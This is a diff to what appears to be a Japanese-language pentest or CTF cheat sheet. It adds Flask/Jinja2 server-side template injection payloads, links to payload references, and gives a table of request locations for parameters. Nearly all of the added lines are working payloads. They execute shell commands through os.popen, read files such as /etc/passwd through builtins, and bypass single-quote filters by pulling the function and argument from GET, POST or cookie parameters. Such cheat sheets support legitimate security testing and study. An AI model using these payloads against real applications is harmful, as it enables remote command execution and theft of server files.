@@ -50,11 +50,41 @@ dig <example.com> TXT
 
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
 
-Jinja2
+**Flask + Jinja2**
+
+参考: https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
 
 ```
 {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
 ```
+
+パラメータ利用 + シングルクォートなし
+
+- `{{ }}`
+
+```
+{{().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()}}
+
+# パラメータ例:
+# - arg1=open
+# - arg2=/etc/passwd
+```
+
+- `{% %}`
+
+```
+{% if request.application.__globals__.__builtins__.__import__(request.args.arg1).popen(request.args.arg2).read() == 1 %}{% endif %}
+
+# パラメータ例:
+# - arg1=os
+# - arg2=sleep 3
+```
+
+| 参照パラメータ | 格納場所             |
+| -------------- | -------------------- |
+| GET            | request.args.arg1    |
+| POST           | request.values.arg1  |
+| Cookie         | request.cookies.arg1 |
 
 ## SQLi
 
